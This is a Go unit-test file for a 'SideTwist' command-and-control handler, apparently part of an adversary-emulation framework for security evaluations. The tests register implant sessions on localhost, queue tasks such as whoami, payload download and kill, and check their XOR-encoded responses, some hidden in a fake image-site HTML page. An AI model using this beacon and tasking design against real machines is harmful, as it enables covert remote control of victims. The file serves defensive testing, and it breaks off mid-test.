package sidetwist

import (
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"testing"
	"time"

	"attackevals.mitre-engenuity.org/control_server/config"
	"attackevals.mitre-engenuity.org/control_server/handlers/util"
	"attackevals.mitre-engenuity.org/control_server/restapi"
	"attackevals.mitre-engenuity.org/control_server/sessions"
)

const (
	handlerName = "sidetwist"
	restAPIlistenHost = "127.0.0.1:9994"
	restAPIBaseURL = "http://" + restAPIlistenHost + "/api/v1.0/"
	getTaskURL = "http://127.0.0.1:8888/search"
	postOutputURL = "http://127.0.0.1:8888/search"
	getFileURL = "http://127.0.0.1:8888/getFile"
	logoURL = "http://127.0.0.1:8888/logo.png"
	templatePath = "templates/home.html"
	firstTask = "101 whoami" // results in base64(XOR(1|101|base64(whoami)))
	firstTaskWant = "XxNFXVQOF1cGGDw5XgQ="
	secondTask = "104 whoami /all" // results in base64(XOR(2|104|base64(whoami /all)))
	secondTaskWant = "XBNFXVEOF1cGGDw5XgQkJksbBykZWA=="
	thirdTask = "101 dir arg1 \"arg with space\" arg3" // results in base64(XOR(3|101|base64(dir arg1 "arg with space" arg3)))
	thirdTaskWant = "XRNFXVQOKSICFywpKQ03HzcULAMoHDQWNl4EKiEKJyYrGTYjIwk7GicGDQgNFQ=="
	fourthTask = "102 C:\\local\\path|payload" // results in base64(XOR(4|102|base64(C:\local\path|payload)))
	fourthTaskWant = "WhNFXVcOIh8eDQcpVh40MgoQBikoVQ8nDBo8Kh8WDFwjBQ=="
	fifthTask = "102 \"C:\\local\\path with spaces\\payload.txt\"|payload" // results in base64(XOR(5|102|base64("C:\local\path with spaces\payload.txt"|payload)))
	fifthTaskWant = "WxNFXVcOOg4jWD0pFwI0VzQAPSYsDQooEwoBQB9VDy0nFAwzKw8oKysNDSIoWhYqXBopJlteACY+HQstMBsAORYTNzglUA=="
	sixthTask = "103 C:\\local\\path" // results in base64(XOR(6|103|base64(C:\local\path)))
	sixthTaskWant = "WBNFXVYOIh8eDQcpVh40MgoQBikoVQ8uSVA="
	killTask = "105" // results in base64(XOR(7|105|))
	killTaskWant = "WRNFXVAO"
	emptyTask = "" // results in base64(XOR(-1||))
	emptyTaskWant = "Q14IEQ=="
	badTask = "101 "
	nonexistentIdTask = "106 whoami"
	logoHash = "84b6d09edb3dc82dd1ef3e7f9d3154f6"
	helloWorldElfHash = "fe7c47d38224529c7d8f9a11a62cdd7a"
	htmlTemplate = `<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en-us" class=" styleguide yui3-js-enabled" id="yui_3_11_0_1_1646155177741_261">
	<div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important" class=""></div>
	<body class="zeus new-footer new-header super-liquid extras quirks en-us liquid" id="yui_3_11_0_1_1646155177741_260" style="margin: 0px;">
	    <div class="wipe-msg" style="font-size:12px;text-align:left;" id="yui_3_11_0_1_1646155177741_267">
		<div style="margin-bottom:3px;">
		    <img alt="NotFlickr" width="162" src="/logo.png">
		</div>
		<script>/*%s*/</script>
		<div style="padding-left:5px;line-height:1.2em;" id="yui_3_11_0_1_1646155177741_266">
		    We're sorry, NotFlickr <a href="." target="_top">doesn't allow embedding within frames</a>.<br><br>If you'd like to view this content, <a href="." target="_top">please click here</a>.
		</div>
	    </div>
	</body>
</html>
`
)

var (
	sampleOutputBase64 = "GgcdHkUbAEULFgQDHxgIRR0GER4bEQ==" // base64(XOR'ed "this is example output")
	taskOutput1, _ = json.Marshal(map[string]string{"1": sampleOutputBase64})
	taskOutput2, _ = json.Marshal(map[string]string{"2": sampleOutputBase64})
	taskOutput3, _ = json.Marshal(map[string]string{"3": sampleOutputBase64})
	taskOutput4, _ = json.Marshal(map[string]string{"4": sampleOutputBase64})
	taskOutput5, _ = json.Marshal(map[string]string{"5": sampleOutputBase64})
	taskOutput6, _ = json.Marshal(map[string]string{"6": sampleOutputBase64})
	firstTaskHtml = fmt.Sprintf(htmlTemplate, firstTaskWant)
	secondTaskHtml = fmt.Sprintf(htmlTemplate, secondTaskWant)
	thirdTaskHtml = fmt.Sprintf(htmlTemplate, thirdTaskWant)
	fourthTaskHtml = fmt.Sprintf(htmlTemplate, fourthTaskWant)
	fifthTaskHtml = fmt.Sprintf(htmlTemplate, fifthTaskWant)
	sixthTaskHtml = fmt.Sprintf(htmlTemplate, sixthTaskWant)
	emptyTaskHtml = fmt.Sprintf(htmlTemplate, emptyTaskWant)
	killTaskHtml = fmt.Sprintf(htmlTemplate, killTaskWant)
)

// exampleBeacon shows how to construct a well formed beacon
var exampleBeacon = sessions.Session{
	GUID:     "sidetwist-implant",
	IPAddr:   "127.0.0.1",
	HostName: "myHostName",
	User:     "myUserName",
	Dir:      "C:\\MyDir\\",
	PID:      1234,
	PPID:     4,
	Task:     "whoami",
}

var configEntry = config.HandlerConfigEntry{
	"host": "127.0.0.1",
	"port": "8888",
}

func startSideTwistHandler(handler *SideTwistHandler, t *testing.T) {
	if err := handler.StartHandler(restAPIlistenHost, configEntry); err != nil {
		t.Errorf("Error when starting SideTwist handler: %s", err.Error())
	}
	util.RunningHandlers[handlerName] = handler
	time.Sleep(50 * time.Millisecond)
}

func stopSideTwistHandler(handler *SideTwistHandler, t *testing.T) {
	if err := handler.StopHandler(); err != nil {
		t.Errorf("Error when stopping SideTwist handler: %s", err.Error())
	}
	delete(util.RunningHandlers, handlerName)
	time.Sleep(50 * time.Millisecond)
}

func startRESTAPI(t *testing.T) {
	restapi.Start(restAPIlistenHost, "./test_payloads")
	time.Sleep(50 * time.Millisecond)
	t.Log("Started rest server")
}

func stopRESTAPI(t *testing.T) {
	restapi.Stop()
	time.Sleep(50 * time.Millisecond)
	t.Log("Stopped rest server")
}

func setTask(task string, guid string) (string, error) {
	url := restAPIBaseURL + "task/" + guid
	
	// setup HTTP POST request
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(task))
	if err != nil {
		return "", err
	}

	// execute HTTP POST and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return "", fmt.Errorf("Expected error code 200, got %v", response.StatusCode)
	}
	body, err := ioutil.ReadAll(response.Body)
	return string(body[:]), err
}

func TestStartStopSideTwistHandler(t *testing.T) {
	handler := sideTwistHandlerFactory(basicResponseWrapper, templatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)
	
	if len(handler.commandNumbers) > 0 {
		t.Error("Expected handler to start with no active implant sessions.")
	}
	if handler.templatePath != templatePath {
		t.Errorf("Expected %s, got %s", templatePath, handler.templatePath)
	}
}

func TestHasImplantSessionAndStoreImplantSession(t *testing.T) {
	handler := sideTwistHandlerFactory(basicResponseWrapper, templatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)
	
	if handler.hasImplantSession("bogus-id") {
		t.Error("Implant bogus-id should not have an active session.")
	}
	guid := "implant1"
	err := handler.storeImplantSession(guid)
	if err != nil {
		t.Error(err.Error())
	}
	if !handler.hasImplantSession(guid) {
		t.Error("Expected implant session to be stored.")
	}
	err = handler.storeImplantSession(guid)
	want := fmt.Sprintf("Session %s already exists.", guid)
	if err != nil {
		if err.Error() != want {
			t.Errorf("Expected error message: %s; got: %s", want, err.Error())
		}
	} else {
		t.Error("Expected error message.")
	}
}

func TestCreateNewSessionDataBytes(t *testing.T) {
	guid := "test-implant-id"
	want := "{\"guid\":\"test-implant-id\"}"
	result := string(createNewSessionDataBytes(guid))
	if result != want {
		t.Errorf("Expected %s; got: %s", want, result)
	}
}

func sendImplantBeacon(t *testing.T, guid string) []byte {
	url := getTaskURL + "/" + guid
	response, err := http.Get(url)
	if err != nil {
		t.Error(err)
	}
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		t.Error(err)
	}
	return body
}

func setAndGetTask(t *testing.T, task, guid string) string{
	_, err := setTask(task, guid)
	if err != nil {
		t.Error(err)
		return ""
	}
	return string(sendImplantBeacon(t, guid))
}

func setAndGetTaskCheckOutput(t *testing.T, task, guid, expectedOutput string) {
	result := setAndGetTask(t, task, guid)
	if result != expectedOutput {
		t.Errorf("Got '%s' expected '%s'", result, expectedOutput)
	}
}

func TestHandleBeaconBasic(t *testing.T) {
	// start REST API
	startRESTAPI(t)
	defer stopRESTAPI(t)
	
	handler := sideTwistHandlerFactory(basicResponseWrapper, templatePath, xorEncrypt, xorEncrypt)
	
	// start handler
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)

	// Send Beacon to establish session. Expecting empty task response.
	body := sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != emptyTaskWant {
		t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskWant)
	}
	
	// make sure session was added
	if !handler.hasImplantSession(exampleBeacon.GUID) {
		t.Error("Expected session to be stored in handler.")
	}
	
	// No tasks available yet
	body = sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != emptyTaskWant {
		t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskWant)
	}
	
	// First task
	setAndGetTaskCheckOutput(t, firstTask, exampleBeacon.GUID, firstTaskWant)
	
	// No task available
	body = sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != emptyTaskWant {
		t.Errorf("Got '%v' expected '%s'", string(body), emptyTaskWant)
	}
	
	// Second task
	setAndGetTaskCheckOutput(t, secondTask, exampleBeacon.GUID, secondTaskWant)
	
	// Bad Task
	_, err := setTask(badTask, exampleBeacon.GUID)
	if err != nil {
		t.Error(err)
	}
	body = sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != serverErrMsg {
		t.Errorf("Got '%s' expected '%s'", string(body), serverErrMsg)
	}
	
	// Third task
	setAndGetTaskCheckOutput(t, thirdTask, exampleBeacon.GUID, thirdTaskWant)
	
	// Nonexistent task ID
	_, err = setTask(nonexistentIdTask, exampleBeacon.GUID)
	if err != nil {
		t.Error(err)
	}
	body = sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != serverErrMsg {
		t.Errorf("Got '%s' expected '%s'", string(body), serverErrMsg)
	}
	
	// Remaining tasks
	setAndGetTaskCheckOutput(t, fourthTask, exampleBeacon.GUID, fourthTaskWant)
	setAndGetTaskCheckOutput(t, fifthTask, exampleBeacon.GUID, fifthTaskWant)
	setAndGetTaskCheckOutput(t, sixthTask, exampleBeacon.GUID, sixthTaskWant)
	setAndGetTaskCheckOutput(t, killTask, exampleBeacon.GUID, killTaskWant)
}

func setBootstrapTask(t *testing.T, task string) {
	req, err := http.NewRequest("POST", restAPIBaseURL + "bootstraptask/sidetwist", bytes.NewBufferString(task))
	if err != nil {
		t.Error(err)
	}
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		t.Error(err)
	}
	defer response.Body.Close()
	
	if response.StatusCode != 200 {
		t.Errorf("Expected error code 200, got %v", response.StatusCode)
	}

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		t.Error(err)
	}
	expectedOutput := "successfully set bootstrap task for handler sidetwist"
	if string(body) != expectedOutput {
		t.Errorf("Expected \"%v\", got \"%v\"", expectedOutput, string(body))
	}
}

func clearBootstrapTask(t *testing.T) {
	delReq, err := http.NewRequest("DELETE", restAPIBaseURL + "bootstraptask/sidetwist", nil)
	if err != nil {
		t.Error(err)
	}
	client := &http.Client{}
	delResp, err := client.Do(delReq)
	if err != nil {
		t.Error(err)
	}
	defer delResp.Body.Close()
	respData, err := ioutil.ReadAll(delResp.Body)
	if err != nil {
		t.Error(err)
	}
	expectedOutput := "successfully removed bootstrap task for handler sidetwist"
	if string(respData) != expectedOutput {
		t.Errorf("Expected '%v' got '%v'", expectedOutput, string(respData))
	}
}

func TestHandleBeaconBasicBootstrap(t *testing.T) {
	// start REST API
	startRESTAPI(t)
	defer stopRESTAPI(t)
	
	handler := sideTwistHandlerFactory(basicResponseWrapper, templatePath, xorEncrypt, xorEncrypt)

	// start handler
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)
	
	// Set bootstrap task
	setBootstrapTask(t, firstTask)
	defer clearBootstrapTask(t)

	// Send Beacon to establish session. Expecting bootstrap task response.
	body := sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != firstTaskWant {
		t.Errorf("Got '%s' expected '%s'", string(body), firstTaskWant)
	}
	
	// make sure session was added
	if !handler.hasImplantSession(exampleBeacon.GUID) {
		t.Error("Expected session to be stored in handler.")
	}
	
	// No tasks available yet
	body = sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != emptyTaskWant {
		t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskWant)
	}
	
	// Second task
	setAndGetTaskCheckOutput(t, secondTask, exampleBeacon.GUID, secondTaskWant)
}

func TestHandleBeaconHtml(t *testing.T) {
	// set current working directory to main repo directory
	// this is needed so that the unit tests can access the correct files
	cwd, _ := os.Getwd()
	os.Chdir("../../")
	defer os.Chdir(cwd)

	// start REST API
	startRESTAPI(t)
	defer stopRESTAPI(t)
	
	handler := sideTwistHandlerFactory(htmlResponseWrapper, defaultHtmlTemplatePath, xorEncrypt, xorEncrypt)

	// start handler
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)

	// Send Beacon to establish session. Expecting empty task response.
	body := sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != emptyTaskHtml {
		t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskHtml)
	}
	
	// make sure session was added
	if !handler.hasImplantSession(exampleBeacon.GUID) {
		t.Error("Expected session to be stored in handler.")
	}
	
	// No tasks available yet
	body = sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != emptyTaskHtml {
		t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskHtml)
	}
	
	// First task
	setAndGetTaskCheckOutput(t, firstTask, exampleBeacon.GUID, firstTaskHtml)
	
	// No task available
	body = sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != emptyTaskHtml {
		t.Errorf("Got '%v' expected '%s'", string(body), emptyTaskHtml)
	}
	
	// Second task
	setAndGetTaskCheckOutput(t, secondTask, exampleBeacon.GUID, secondTaskHtml)
	
	// Bad Task
	_, err := setTask(badTask, exampleBeacon.GUID)
	if err != nil {
		t.Error(err)
	}
	body = sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != serverErrMsg {
		t.Errorf("Got '%s' expected '%s'", string(body), serverErrMsg)
	}
	
	// Third task
	setAndGetTaskCheckOutput(t, thirdTask, exampleBeacon.GUID, thirdTaskHtml)
	
	// Nonexistent task ID
	_, err = setTask(nonexistentIdTask, exampleBeacon.GUID)
	if err != nil {
		t.Error(err)
	}
	body = sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != serverErrMsg {
		t.Errorf("Got '%s' expected '%s'", string(body), serverErrMsg)
	}
	
	// Remaining tasks
	setAndGetTaskCheckOutput(t, fourthTask, exampleBeacon.GUID, fourthTaskHtml)
	setAndGetTaskCheckOutput(t, fifthTask, exampleBeacon.GUID, fifthTaskHtml)
	setAndGetTaskCheckOutput(t, sixthTask, exampleBeacon.GUID, sixthTaskHtml)
	setAndGetTaskCheckOutput(t, killTask, exampleBeacon.GUID, killTaskHtml)
}

func TestHandleBeaconHtmlBootstrap(t *testing.T) {
	// set current working directory to main repo directory
	// this is needed so that the unit tests can access the correct files
	cwd, _ := os.Getwd()
	os.Chdir("../../")
	defer os.Chdir(cwd)

	// start REST API
	startRESTAPI(t)
	defer stopRESTAPI(t)
	
	handler := sideTwistHandlerFactory(htmlResponseWrapper, defaultHtmlTemplatePath, xorEncrypt, xorEncrypt)
	
	// start handler
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)

	// Set bootstrap task
	setBootstrapTask(t, firstTask)
	defer clearBootstrapTask(t)

	// Send Beacon to establish session. Expecting bootstrap task response.
	body := sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != firstTaskHtml {
		t.Errorf("Got '%s' expected '%s'", string(body), firstTaskHtml)
	}
	
	// make sure session was added
	if !handler.hasImplantSession(exampleBeacon.GUID) {
		t.Error("Expected session to be stored in handler.")
	}
	
	// No tasks available yet
	body = sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != emptyTaskHtml {
		t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskHtml)
	}
	
	// Second task
	setAndGetTaskCheckOutput(t, secondTask, exampleBeacon.GUID, secondTaskHtml)
}

func convertAndCheckTask(handler *SideTwistHandler, t *testing.T, guid, task, want string) {
	response, err := handler.convertTaskToResponse(guid, task)
	if response != want {
		t.Errorf("Expected %s; got: %s", want, response)
	}
	if err != nil {
		t.Errorf("Expected no error, got: %s", err.Error())
	}
}

func TestConvertTaskToResponseBasic(t *testing.T) {
	handler := sideTwistHandlerFactory(basicResponseWrapper, templatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)
	
	// Test getting task for nonexistent implant session
	want := fmt.Sprintf("No existing session for implant %s.", exampleBeacon.GUID)
	response, err := handler.convertTaskToResponse(exampleBeacon.GUID, firstTask)
	if len(response) > 0 {
		t.Errorf("Expected empty response string, got %s", response)
	}
	if err == nil {
		t.Error("Expected error, got nil")
	} else {
		if err.Error() != want {
			t.Errorf("Expected error message: %s; got: %s", want, err.Error())
		}
	}
	handler.storeImplantSession(exampleBeacon.GUID)
	
	// First task
	convertAndCheckTask(handler, t, exampleBeacon.GUID, firstTask, firstTaskWant)
	
	// Empty task
	response, err = handler.convertTaskToResponse(exampleBeacon.GUID, emptyTask)
	if response != emptyTaskWant {
		t.Errorf("Expected %s; got: %s", emptyTaskWant, response)
	}
	if err != nil {
		t.Errorf("Expected no error, got: %s", err.Error())
	}
	
	// Second Task
	convertAndCheckTask(handler, t, exampleBeacon.GUID, secondTask, secondTaskWant)
	
	// Bad Task
	response, err = handler.convertTaskToResponse(exampleBeacon.GUID, badTask)
	want = fmt.Sprintf("Task requires command ID and command arg. Provided: %s", badTask)
	if len(response) > 0 {
		t.Errorf("Expected empty response string, got %s", response)
	}
	if err == nil {
		t.Error("Expected error, got nil")
	} else {
		if err.Error() != want {
			t.Errorf("Expected error message: %s; got: %s", want, err.Error())
		}
	}
	
	// Third Task
	convertAndCheckTask(handler, t, exampleBeacon.GUID, thirdTask, thirdTaskWant)
	
	// Nonexistent Task ID
	response, err = handler.convertTaskToResponse(exampleBeacon.GUID, nonexistentIdTask)
	want = "Received task with unsupported command ID: 106"
	if len(response) > 0 {
		t.Errorf("Expected empty response string, got %s", response)
	}
	if err == nil {
		t.Error("Expected error, got nil")
	} else {
		if err.Error() != want {
			t.Errorf("Expected error message: %s; got: %s", want, err.Error())
		}
	}
	
	// Remaining tasks
	convertAndCheckTask(handler, t, exampleBeacon.GUID, fourthTask, fourthTaskWant)
	convertAndCheckTask(handler, t, exampleBeacon.GUID, fifthTask, fifthTaskWant)
	convertAndCheckTask(handler, t, exampleBeacon.GUID, sixthTask, sixthTaskWant)
	convertAndCheckTask(handler, t, exampleBeacon.GUID, killTask, killTaskWant)
}

func TestConvertTaskToResponseHtml(t *testing.T) {
	// set current working directory to main repo directory
	// this is needed so that the unit tests can access the correct files
	cwd, _ := os.Getwd()
	os.Chdir("../../")
	defer os.Chdir(cwd)
	
	handler := sideTwistHandlerFactory(htmlResponseWrapper, defaultHtmlTemplatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)
	
	// Test getting task for nonexistent implant session
	want := fmt.Sprintf("No existing session for implant %s.", exampleBeacon.GUID)
	response, err := handler.convertTaskToResponse(exampleBeacon.GUID, firstTask)
	if len(response) > 0 {
		t.Errorf("Expected empty response string, got %s", response)
	}
	if err == nil {
		t.Error("Expected error, got nil")
	} else {
		if err.Error() != want {
			t.Errorf("Expected error message: %s; got: %s", want, err.Error())
		}
	}
	handler.storeImplantSession(exampleBeacon.GUID)
	
	// First task
	convertAndCheckTask(handler, t, exampleBeacon.GUID, firstTask, firstTaskHtml)
	
	// Empty task
	response, err = handler.convertTaskToResponse(exampleBeacon.GUID, emptyTask)
	if response != emptyTaskHtml {
		t.Errorf("Expected %s; got: %s", emptyTaskHtml, response)
	}
	if err != nil {
		t.Errorf("Expected no error, got: %s", err.Error())
	}
	
	// Second Task
	convertAndCheckTask(handler, t, exampleBeacon.GUID, secondTask, secondTaskHtml)
	
	// Bad Task
	response, err = handler.convertTaskToResponse(exampleBeacon.GUID, badTask)
	want = fmt.Sprintf("Task requires command ID and command arg. Provided: %s", badTask)
	if len(response) > 0 {
		t.Errorf("Expected empty response string, got %s", response)
	}
	if err == nil {
		t.Error("Expected error, got nil")
	} else {
		if err.Error() != want {
			t.Errorf("Expected error message: %s; got: %s", want, err.Error())
		}
	}
	
	// Third Task
	convertAndCheckTask(handler, t, exampleBeacon.GUID, thirdTask, thirdTaskHtml)
	
	// Nonexistent Task ID
	response, err = handler.convertTaskToResponse(exampleBeacon.GUID, nonexistentIdTask)
	want = "Received task with unsupported command ID: 106"
	if len(response) > 0 {
		t.Errorf("Expected empty response string, got %s", response)
	}
	if err == nil {
		t.Error("Expected error, got nil")
	} else {
		if err.Error() != want {
			t.Errorf("Expected error message: %s; got: %s", want, err.Error())
		}
	}
	
	// Remaining tasks
	convertAndCheckTask(handler, t, exampleBeacon.GUID, fourthTask, fourthTaskHtml)
	convertAndCheckTask(handler, t, exampleBeacon.GUID, fifthTask, fifthTaskHtml)
	convertAndCheckTask(handler, t, exampleBeacon.GUID, sixthTask, sixthTaskHtml)
	convertAndCheckTask(handler, t, exampleBeacon.GUID, killTask, killTaskHtml)
}

// Send the following output data for implant guid to the SideTwist handler via POST request. 
// Ensure that the returned response and status code match the expected response and status code.
func sendOutputAndCheckResponse(t *testing.T, guid string, output []byte, expectedResponse string, expectedStatusCode int) {
	// setup HTTP POST request
	req, err := http.NewRequest("POST", postOutputURL + "/" + guid, bytes.NewBuffer(output))
	if err != nil {
		t.Error(err)
	}

	// execute HTTP POST and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		t.Error(err)
	}
	defer response.Body.Close()

	if response.StatusCode != expectedStatusCode {
		t.Errorf("Expected error code expected %d, got %v", expectedStatusCode, response.StatusCode)
	}

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		t.Error(err)
	}

	if string(body) != expectedResponse {
		t.Errorf("Expected \"%v\", got \"%v\"", expectedResponse, string(body))
	}
}

// Process the following output data for implant guid and forward it to the REST server.
// Ensure that the returned response and error status match expected values.
func forwardOutputAndCheckResponse(t *testing.T, handler *SideTwistHandler, guid string, output []byte, expectedResponse string, expectedError bool) {
	// forward output to REST server
	response, err := handler.processAndForwardImplantOutput(guid, output)

	if expectedError {
		if err == nil {
			t.Error("Expected error but none was returned")
		} else if expectedResponse != err.Error() {
			t.Errorf("Expected error message %s; got %s", expectedResponse, err.Error())
		}
	} else {
		if err != nil {
			t.Errorf("Did not expect error but received: %s", err.Error())
		} else if expectedResponse != response {
			t.Errorf("Expected %s; got %s", expectedResponse, response)
		}
	}
}

func TestProcessAndForwardImplantOutput(t *testing.T) {
	// start REST API
	startRESTAPI(t)
	defer stopRESTAPI(t)
	
	// start handler
	handler := sideTwistHandlerFactory(basicResponseWrapper, templatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)
	
	// Send output for nonexistent implant session. Error expected
	expectedResponse := fmt.Sprintf("Implant %s does not have any tasks pending output.", exampleBeacon.GUID)
	forwardOutputAndCheckResponse(t, handler, exampleBeacon.GUID, taskOutput1, expectedResponse, true)

	// Register implant session
	body := sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != emptyTaskWant {
		t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskWant)
	}
	
	// make sure session was added
	if !handler.hasImplantSession(exampleBeacon.GUID) {
		t.Error("Expected session to be stored in handler.")
	}

	// Send output for unassigned task. Error expected.
	expectedResponse = fmt.Sprintf("Implant %s does not have task 1 pending output.", exampleBeacon.GUID)
	forwardOutputAndCheckResponse(t, handler, exampleBeacon.GUID, taskOutput1, expectedResponse, true)
	
	// Assign first task
	setAndGetTask(t, firstTask, exampleBeacon.GUID)
	if !handler.pendingCommandOutput[exampleBeacon.GUID][1] {
		t.Error("Expected task 1 to be marked as pending")
	}
	
	// Send output for wrong task number. Error expected.
	expectedResponse = fmt.Sprintf("Implant %s does not have task 2 pending output.", exampleBeacon.GUID)
	forwardOutputAndCheckResponse(t, handler, exampleBeacon.GUID, taskOutput2, expectedResponse, true)
	if !handler.pendingCommandOutput[exampleBeacon.GUID][1] {
		t.Error("Expected task 1 to be marked as pending")
	}
	
	// Send output for task 1
	forwardOutputAndCheckResponse(t, handler, exampleBeacon.GUID, taskOutput1, "successfully set task output", false)
	if handler.pendingCommandOutput[exampleBeacon.GUID][1] {
		t.Error("Expected task 1 to not be marked as pending")
	}
	
	// Send output again for task 1. Error expected
	expectedResponse = fmt.Sprintf("Implant %s does not have task 1 pending output.", exampleBeacon.GUID)
	forwardOutputAndCheckResponse(t, handler, exampleBeacon.GUID, taskOutput1, expectedResponse, true)
	
	// Assign task 2
	setAndGetTask(t, secondTask, exampleBeacon.GUID)
	
	// Send output for task 1. Error expected
	forwardOutputAndCheckResponse(t, handler, exampleBeacon.GUID, taskOutput1, expectedResponse, true)
	
	// Send output for task 2
	forwardOutputAndCheckResponse(t, handler, exampleBeacon.GUID, taskOutput2, "successfully set task output", false)
	
	// Assign task 3
	setAndGetTask(t, thirdTask, exampleBeacon.GUID)
	forwardOutputAndCheckResponse(t, handler, exampleBeacon.GUID, taskOutput3, "successfully set task output", false)
	
	// Send output for payload tasks.
	setAndGetTask(t, fourthTask, exampleBeacon.GUID)
	forwardOutputAndCheckResponse(t, handler, exampleBeacon.GUID, taskOutput4, "successfully set task output", false)
	setAndGetTask(t, fifthTask, exampleBeacon.GUID)
	forwardOutputAndCheckResponse(t, handler, exampleBeacon.GUID, taskOutput5, "successfully set task output", false)
	
	// Send output for kill task. Error expected
	expectedResponse = fmt.Sprintf("Implant %s does not have task 6 pending output.", exampleBeacon.GUID)
	setAndGetTask(t, killTask, exampleBeacon.GUID)
	forwardOutputAndCheckResponse(t, handler, exampleBeacon.GUID, taskOutput6, expectedResponse, true)
}

func TestHandleResponseTaskOutput(t *testing.T) {
	// start REST API
	startRESTAPI(t)
	defer stopRESTAPI(t)
	
	// start handler
	handler := sideTwistHandlerFactory(basicResponseWrapper, templatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)

	// Send output for nonexistent implant session. Error expected
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, taskOutput1, serverErrMsg, 500)

	// Register implant session
	body := sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != emptyTaskWant {
		t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskWant)
	}
	
	// make sure session was added
	if !handler.hasImplantSession(exampleBeacon.GUID) {
		t.Error("Expected session to be stored in handler.")
	}

	// Send output for unassigned task. Error expected.
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, taskOutput1, serverErrMsg, 500)
	
	// Assign first task
	setAndGetTask(t, firstTask, exampleBeacon.GUID)
	
	// Send output for wrong task number. Error expected.
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, taskOutput2, serverErrMsg, 500)
	
	// Send output for task 1
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, taskOutput1, "", 200)
	
	// Send output again for task 1. Error expected
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, taskOutput1, serverErrMsg, 500)
	
	// Assign task 2
	setAndGetTask(t, secondTask, exampleBeacon.GUID)
	
	// Send output for task 1. Error expected
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, taskOutput1, serverErrMsg, 500)
	
	// Send output for task 2
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, taskOutput2, "", 200)
	
	// Assign task 3
	setAndGetTask(t, thirdTask, exampleBeacon.GUID)
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, taskOutput3, "", 200)
	
	// Send output for payload tasks.
	setAndGetTask(t, fourthTask, exampleBeacon.GUID)
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, taskOutput4, "", 200)
	setAndGetTask(t, fifthTask, exampleBeacon.GUID)
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, taskOutput5, "", 200)
	
	// Send output for kill task. Error expected
	setAndGetTask(t, killTask, exampleBeacon.GUID)
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, taskOutput6, serverErrMsg, 500)
}

func TestForwardGetFileFromServer(t *testing.T) {
	// set current working directory to main repo directory
	// this is needed so that the unit tests can find the requested payload
	cwd, _ := os.Getwd()
	os.Chdir("../../")
	defer os.Chdir(cwd) // restore cwd at end of test

	// start REST API
	startRESTAPI(t)
	defer stopRESTAPI(t)

	// start handler
	handler := sideTwistHandlerFactory(basicResponseWrapper, defaultHtmlTemplatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)

	fileData, err := handler.forwardGetFileFromServer("hello_world.elf")
	if err != nil {
		t.Error(err)
	}

	h := md5.Sum(fileData)
	actualHash := hex.EncodeToString(h[:])
	if helloWorldElfHash != actualHash {
		t.Errorf("Expected %v, got %v", helloWorldElfHash, actualHash)
	}

	// Test nonexistent file
	fileData, err = handler.forwardGetFileFromServer("nonexistent.file")
	want := "server did not return requested file: nonexistent.file"
	if len(fileData) > 0 {
